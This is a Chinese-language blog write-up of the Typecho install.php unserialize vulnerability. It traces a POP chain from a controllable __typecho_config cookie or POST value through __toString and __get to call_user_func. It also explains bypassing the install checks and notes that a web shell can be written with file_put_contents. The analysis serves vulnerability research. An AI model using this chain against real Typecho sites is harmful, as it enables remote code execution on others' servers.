<h2 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h2><p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;&#x5728; <code>./install.php</code>&#x3002;&#x5B9A;&#x4F4D;&#x654F;&#x611F;&#x51FD;&#x6570; <code>unserialize</code>&#x3002;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x5B9A;&#x4F4D;&#x5230;&#x4E86;&#x4E24;&#x4E2A;&#x6709;&#x5173;&#x5229;&#x7528;&#x70B9;&#xFF0C;&#x4F46;&#x662F;&#x5176;&#x5B9E;&#x53EA;&#x6709;&#x7B2C;&#x4E00;&#x5904;&#x80FD;&#x591F;&#x5229;&#x7528;&#x3002;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#x5728; 231-237&#x884C;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="hljs-string">&apos;__typecho_config&apos;</span>)));</span><br><span class="line">Typecho_Cookie::delete(<span class="hljs-string">&apos;__typecho_config&apos;</span>);</span><br><span class="line">$db = <span class="hljs-keyword">new</span> Typecho_Db($config[<span class="hljs-string">&apos;adapter&apos;</span>], $config[<span class="hljs-string">&apos;prefix&apos;</span>]);</span><br><span class="line">$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">Typecho_Db::set($db);</span><br></pre></td></tr></tbody></table></figure><br>&#x5BFB;&#x627E;<code>unserialize</code>&#x51FD;&#x6570;&#x4E2D;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x53EF;&#x63A7;&#x3002;&#x53EF;&#x89C1;&#x5148;&#x7ECF;&#x8FC7;&#x4E00;&#x6B21; <code>base64_decode</code> &#x51FD;&#x6570;&#x89E3;&#x7801;&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;&#x7684;&#x662F; <code>Typecho_Cookie</code> &#x7C7B;&#x4E0B;&#x7684;<code>get</code>&#x65B9;&#x6CD5;&#x3002;<p></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    $key = <span class="hljs-keyword">self</span>::$_prefix . $key;</span><br><span class="line">    $value = <span class="hljs-keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="hljs-keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">    <span class="hljs-keyword">return</span> is_array($value) ? $default : $value;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5173;&#x952E;&#x70B9;&#x5728; <code>value</code> &#x9644;&#x503C;&#x5904;&#x3002;&#x53EF;&#x89C1;&#x8BBE;&#x5B9A;&#x4E86;&#x4E24;&#x4E2A;&#x4E09;&#x5143;&#x8FD0;&#x7B97;&#x7B26;&#x8FDB;&#x884C;&#x5D4C;&#x5957;, &#x901A;&#x8FC7; <code>$_COOKIE</code> &#x548C; <code>$_POST</code> &#x5BF9;&#x5176;&#x9644;&#x503C;&#x3002;&#x53EF;&#x89C1;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7; POST &#x65B9;&#x6CD5;&#x6765;&#x63A7;&#x5236; key &#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x4ECE;&#x800C;&#x63A7;&#x5236; value &#x3002;</p>
<p>&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x62E5;&#x6709;&#x4E86;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x70B9;(<code>unserialize</code>),&#x548C;&#x6211;&#x4EEC;&#x7684;&#x53EF;&#x63A7;&#x53D8;&#x91CF;&#xFF08;<code>$_POST</code> &#x5BF9;<code>__typecho_config</code> &#x9644;&#x503C;&#xFF09;&#x3002;</p>
<p>&#x601D;&#x8003;&#xFF1A;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5F97;&#x5230;&#x4E86;&#x4EC0;&#x4E48;&#xFF1F;<br>&#x2014;&#x2014;&#x300B; <code>$config</code>&#x53D8;&#x91CF;&#x7684;&#x53EF;&#x63A7;&#x6027;&#x3002;</p>
<p>&#x7D27;&#x63A5;&#x7740;&#x4F53;&#x73B0; <code>$config</code> &#x53D8;&#x91CF;&#x53EF;&#x63A7;&#x6027;&#x7684;&#x5730;&#x65B9;&#x5728; <code>$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);</code>&#x3002; &#x7A0B;&#x5E8F;&#x901A;&#x8FC7; <code>Typecho_Db</code> &#x8FDB;&#x884C;&#x4E86;&#x5B9E;&#x4F8B;&#x5316;&#x3002;&#x8DDF;&#x8FDB;&#x65B9;&#x6CD5;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Db</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($adapterName, $prefix = <span class="hljs-string">&apos;typecho_&apos;</span>)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-comment">/** &#x83B7;&#x53D6;&#x9002;&#x914D;&#x5668;&#x540D;&#x79F0; */</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">/** &#x6570;&#x636E;&#x5E93;&#x9002;&#x914D;&#x5668; */</span></span><br><span class="line">        $adapterName = <span class="hljs-string">&apos;Typecho_Db_Adapter_&apos;</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (!call_user_func(<span class="hljs-keyword">array</span>($adapterName, <span class="hljs-string">&apos;isAvailable&apos;</span>))) {</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Typecho_Db_Exception(<span class="hljs-string">&quot;Adapter {$adapterName} is not available&quot;</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">/** &#x521D;&#x59CB;&#x5316;&#x5185;&#x90E8;&#x53D8;&#x91CF; */</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_pool = <span class="hljs-keyword">array</span>();</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_connectedPool = <span class="hljs-keyword">array</span>();</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_config = <span class="hljs-keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">//&#x5B9E;&#x4F8B;&#x5316;&#x9002;&#x914D;&#x5668;&#x5BF9;&#x8C61;</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_adapter = <span class="hljs-keyword">new</span> $adapterName();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5173;&#x952E;&#x4EE3;&#x7801;&#x4E3A; <code>$adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName;</code>&#xFF0C; &#x8FD9;&#x91CC;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x62FC;&#x63A5;&#x3002;&#x4E14; <code>adapterName</code> &#x662F;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x3002;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x7C7B;&#xFF0C;PHP&#x5C31;&#x4F1A;&#x505A;&#x4E00;&#x4E2A;&#x4ECE;&#x7C7B;&#x5230;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x5F3A;&#x5236;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#x3002;&#x7531;&#x6B64;&#x4F1A;&#x89E6;&#x53D1;&#x90A3;&#x4E2A;&#x7C7B;&#x7684; <code>toString</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x76EE;&#x524D;&#x7684;&#x5229;&#x7528;&#x94FE;&#x4E3A;: <code>install.php</code> &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BFC;&#x81F4;<code>$config</code> &#x53D8;&#x91CF;&#x53EF;&#x63A7; &#x2014;&#x2014;&gt; <code>Cookie.php</code> &#x4E2D;<code>.</code>&#x62FC;&#x63A5;&#x5BFC;&#x81F4;&#x5F3A;&#x5236;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#x89E6;&#x53D1;&#x4F20;&#x5165;&#x7C7B; <code>__tostring</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5C31;&#x5F00;&#x59CB;&#x5BFB;&#x627E;&#x6211;&#x4EEC;&#x53EF;&#x5229;&#x7528;&#x7684; <code>tostring</code> &#x65B9;&#x6CD5;&#x3002;&#x4E00;&#x5171;&#x4E09;&#x5904;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x53EA;&#x6709; <code>var/Typecho/Feed.php</code> &#x4E00;&#x5904;&#x3002;&#x622A;&#x53D6;&#x90E8;&#x5206;&#x4EE3;&#x7801;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $_items = <span class="hljs-keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment">     * $item&#x7684;&#x683C;&#x5F0F;&#x4E3A;</span></span><br><span class="line"><span class="hljs-comment">     * &lt;code&gt;</span></span><br><span class="line"><span class="hljs-comment">     * array (</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;title&apos;      =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;content&apos;    =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;excerpt&apos;    =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;date&apos;       =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;link&apos;       =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;author&apos;     =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;comments&apos;   =&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;commentsUrl&apos;=&gt;  &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     *     &apos;commentsFeedUrl&apos; =&gt; &apos;xxx&apos;,</span></span><br><span class="line"><span class="hljs-comment">     * )</span></span><br><span class="line"><span class="hljs-comment">     * &lt;/code&gt;</span></span><br><span class="line"><span class="hljs-comment">     *</span></span><br><span class="line"><span class="hljs-comment">     * <span class="hljs-doctag">@access</span> public</span></span><br><span class="line"><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> array $item</span></span><br><span class="line"><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> unknown</span></span><br><span class="line"><span class="hljs-comment">     */</span></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addItem</span><span class="hljs-params">(array $item)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_items[] = $item;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># ~ ~ ~ ~ ~ ~ &#x7701;&#x7565;&#x90E8;&#x5206;&#x4EE3;&#x7801;</span></span><br><span class="line">    </span><br><span class="line">               <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;_items <span class="hljs-keyword">as</span> $item) {</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;item&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;title&gt;&apos;</span> . htmlspecialchars($item[<span class="hljs-string">&apos;title&apos;</span>]) . <span class="hljs-string">&apos;&lt;/title&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;link&gt;&apos;</span> . $item[<span class="hljs-string">&apos;link&apos;</span>] . <span class="hljs-string">&apos;&lt;/link&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;guid&gt;&apos;</span> . $item[<span class="hljs-string">&apos;link&apos;</span>] . <span class="hljs-string">&apos;&lt;/guid&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;pubDate&gt;&apos;</span> . <span class="hljs-keyword">$this</span>-&gt;dateFormat($item[<span class="hljs-string">&apos;date&apos;</span>]) . <span class="hljs-string">&apos;&lt;/pubDate&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="hljs-string">&apos;&lt;dc:creator&gt;&apos;</span> . htmlspecialchars($item[<span class="hljs-string">&apos;author&apos;</span>]-&gt;screenName) . <span class="hljs-string">&apos;&lt;/dc:creator&gt;&apos;</span> . <span class="hljs-keyword">self</span>::EOL;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5173;&#x952E;&#x70B9;&#x5728; 290&#x884C;&#xFF0C; <code>$content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL;</code> &#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x63A7; <code>$item[&apos;author&apos;]</code>&#x3002;&#x5F53;&#x4ED6;&#x88AB;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x7C7B;&#xFF0C;&#x4E14;&#x4ECE;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;<code>screenName</code>&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4F1A;&#x8C03;&#x7528; <code>__get</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x76EE;&#x524D;&#x7684;&#x5229;&#x7528;&#x94FE;&#x4E3A;: <code>install.php</code> &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BFC;&#x81F4;<code>$config</code> &#x53D8;&#x91CF;&#x53EF;&#x63A7; &#x2014;&#x2014;&gt; <code>Cookie.php</code> &#x4E2D;<code>.</code>&#x62FC;&#x63A5;&#x5BFC;&#x81F4;&#x5F3A;&#x5236;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#x89E6;&#x53D1;&#x4F20;&#x5165;&#x7C7B; <code>__tostring</code> &#x65B9;&#x6CD5;&#x3002;&#x2014;&#x2014;&gt; <code>Feed.php</code> &#x4E2D;&#x63A7;&#x5236; <code>$item[&apos;author&apos;]</code> &#x53BB;&#x89E6;&#x53D1;&#x4F20;&#x5165;&#x7C7B;&#x7684; <code>__get</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5F00;&#x59CB;&#x5BFB;&#x627E; <code>__get</code> &#x65B9;&#x6CD5;&#x3002;&#x627E;&#x5230;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x6587;&#x4EF6; <code>Request.php</code></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span><span class="hljs-params">($key)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><br>&#x8DDF;&#x8FDB;&#x91CC;&#x9762;&#x8C03;&#x7528;&#x7684; <code>get</code> &#x51FD;&#x6570;<p></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">true</span>) {</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">                $value = <span class="hljs-keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">                $value = <span class="hljs-keyword">self</span>::$_httpParams[$key];</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">default</span>:</span><br><span class="line">                $value = $default;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="hljs-number">0</span> ? $value : $default;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6700;&#x540E; <code>return</code> &#x8FD4;&#x56DE;&#x503C;&#x7ECF;&#x8FC7;&#x4E86; <code>_applyFilter</code> &#x5904;&#x7406;&#xFF0C;&#x8DDF;&#x8FDB; <code>_applyFilter</code></p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_applyFilter</span><span class="hljs-params">($value)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_filter) {</span><br><span class="line">            <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;_filter <span class="hljs-keyword">as</span> $filter) {</span><br><span class="line">                $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">                call_user_func($filter, $value);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;_filter = <span class="hljs-keyword">array</span>();</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure><br>&#x53D1;&#x73B0;&#x654F;&#x611F;&#x51FD;&#x6570;: <code>call_user_func</code> &#x3002;&#x4E14; <code>$filter</code>&#x901A;&#x8FC7; <code>private $_filter = array();</code> +  <code>foreach ($this-&gt;_filter as $filter)</code> &#x5F97;&#x5230;&#xFF0C;<code>$filter</code>&#x53EF;&#x63A7;&#x3002;<code>$value</code> &#x901A;&#x8FC7; <code>_params[$key]</code>&#x95F4;&#x63A5;&#x5F97;&#x5230;&#xFF0C;&#x6240;&#x4EE5;&#x4E5F;&#x662F;&#x53EF;&#x63A7;&#x7684;&#x3002;<p></p>
<p>&#x7531;&#x6B64;&#x5B8C;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x7684;POP&#x94FE;</p>
<p>&#x4F46;&#x5728;&#x5230;&#x8FBE;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x70B9;&#xFF08;<code>unserialize</code>&#x51FD;&#x6570;&#xFF09;&#x4E4B;&#x524D;&#xFF0C;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x4E86;&#x4E24;&#x4E2A;&#x9650;&#x5236;&#x3002;&#x5927;&#x6982;&#x529F;&#x80FD;&#x5728;&#x6CE8;&#x91CA;&#x4E2D;&#x4E5F;&#x5199;&#x7684;&#x6E05;&#x695A;&#x660E;&#x4E86;&#x4E86;&#x3002;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">//&#x5224;&#x65AD;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&apos;finish&apos;</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="hljs-string">&apos;/config.inc.php&apos;</span>) &amp;&amp; <span class="hljs-keyword">empty</span>($_SESSION[<span class="hljs-string">&apos;typecho&apos;</span>])) {</span><br><span class="line">    <span class="hljs-keyword">exit</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x6321;&#x6389;&#x53EF;&#x80FD;&#x7684;&#x8DE8;&#x7AD9;&#x8BF7;&#x6C42;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($_GET) || !<span class="hljs-keyword">empty</span>($_POST)) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&apos;HTTP_REFERER&apos;</span>])) {</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[<span class="hljs-string">&apos;HTTP_REFERER&apos;</span>]);</span><br><span class="line">	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($parts[<span class="hljs-string">&apos;port&apos;</span>])) {</span><br><span class="line">        $parts[<span class="hljs-string">&apos;host&apos;</span>] = <span class="hljs-string">&quot;{$parts[&apos;host&apos;]}:{$parts[&apos;port&apos;]}&quot;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($parts[<span class="hljs-string">&apos;host&apos;</span>]) || $_SERVER[<span class="hljs-string">&apos;HTTP_HOST&apos;</span>] != $parts[<span class="hljs-string">&apos;host&apos;</span>]) {</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><br>&#x9488;&#x5BF9;&#x7B2C;&#x4E00;&#x70B9;: &#x901A;&#x8FC7;GET&#x4F20;&#x53C2; finish &#x5C31;&#x80FD;&#x7ED5;&#x8FC7;&#xFF1B; &#x9488;&#x5BF9;&#x7B2C;&#x4E8C;&#x70B9;&#xFF1A; refer&#x6765;&#x81EA;&#x672C;&#x7AD9;&#x5373;&#x53EF;<p></p>
<p>&#x6700;&#x540E;&#x6709;&#x4E00;&#x4E2A;&#x5751;&#x6765;&#x81EA;&#x4E8E; <code>install.php</code> &#x6700;&#x5F00;&#x5934;&#x7684; <code>ob_start();</code>&#x3002;</p>
<p>@LoRexxar&#x5E08;&#x5085;&#x63D0;&#x5230;</p>
<blockquote>
<p>&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x4E0A;&#x9762;&#x5BF9;&#x8C61;&#x6CE8;&#x5165;&#x7684;&#x4EE3;&#x7801;&#x89E6;&#x53D1;&#x4E86;&#x539F;&#x672C;&#x7684;<code>exception</code>&#xFF0C;&#x5BFC;&#x81F4;<code>ob_end_clean()</code>&#x6267;&#x884C;&#xFF0C;&#x539F;&#x672C;&#x7684;&#x8F93;&#x51FA;&#x4F1A;&#x5728;&#x7F13;&#x51B2;&#x533A;&#x88AB;&#x6E05;&#x7406;&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x60F3;&#x4E00;&#x4E2A;&#x529E;&#x6CD5;&#x5F3A;&#x5236;&#x9000;&#x51FA;&#xFF0C;&#x4F7F;&#x5F97;&#x4EE3;&#x7801;&#x4E0D;&#x4F1A;&#x6267;&#x884C;&#x5230;<code>exception</code>&#xFF0C;&#x8FD9;&#x6837;&#x539F;&#x672C;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x6570;&#x636E;&#x5C31;&#x4F1A;&#x88AB;&#x8F93;&#x51FA;&#x51FA;&#x6765;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x4E2A;&#x529E;&#x6CD5;&#x3002; 1&#x3001;&#x56E0;&#x4E3A;<code>call_user_func</code>&#x51FD;&#x6570;&#x5904;&#x662F;&#x4E00;&#x4E2A;&#x5FAA;&#x73AF;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x6570;&#x7EC4;&#x6765;&#x63A7;&#x5236;&#x7B2C;&#x4E8C;&#x6B21;&#x6267;&#x884C;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x7136;&#x540E;&#x627E;&#x4E00;&#x5904;<code>exit</code>&#x8DF3;&#x51FA;&#xFF0C;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5C31;&#x4F1A;&#x88AB;&#x8F93;&#x51FA;&#x51FA;&#x6765;&#x3002; 2&#x3001;&#x7B2C;&#x4E8C;&#x4E2A;&#x529E;&#x6CD5;&#x5C31;&#x662F;&#x5728;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x4E4B;&#x540E;&#xFF0C;&#x60F3;&#x529E;&#x6CD5;&#x9020;&#x6210;&#x4E00;&#x4E2A;&#x62A5;&#x9519;&#xFF0C;&#x8BED;&#x53E5;&#x62A5;&#x9519;&#x5C31;&#x4F1A;&#x5F3A;&#x5236;&#x505C;&#x6B62;&#xFF0C;&#x8FD9;&#x6837;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4ECD;&#x7136;&#x4F1A;&#x88AB;&#x8F93;&#x51FA;&#x51FA;&#x6765;&#x3002;</p>
</blockquote>
<p>&#x540C;&#x65F6; @pupiles &#x5E08;&#x5085;&#x4E5F;&#x5728;blog&#x4E2D;&#x6307;&#x51FA;&#xFF0C;&#x7531;&#x4E8E;&#x8C03;&#x7528;&#x4E86;<code>ob_end_clean</code>&#x65B9;&#x6CD5;&#x6E05;&#x7A7A;&#x4E86;&#x7F13;&#x51B2;&#x533A;&#x3002;&#x5BFC;&#x81F4;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#xFF0C;&#x4F46;&#x662F;php&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x6210;&#x529F;&#x6267;&#x884C;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7; <code>file_put_contents</code> &#x5199;&#x5165;shell</p>
<p>&#x89E3;&#x51B3;&#x4E86;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6574;&#x4E2A;&#x5229;&#x7528;ROP&#x94FE;&#x5C31;&#x6210;&#x7ACB;&#x4E86;</p>
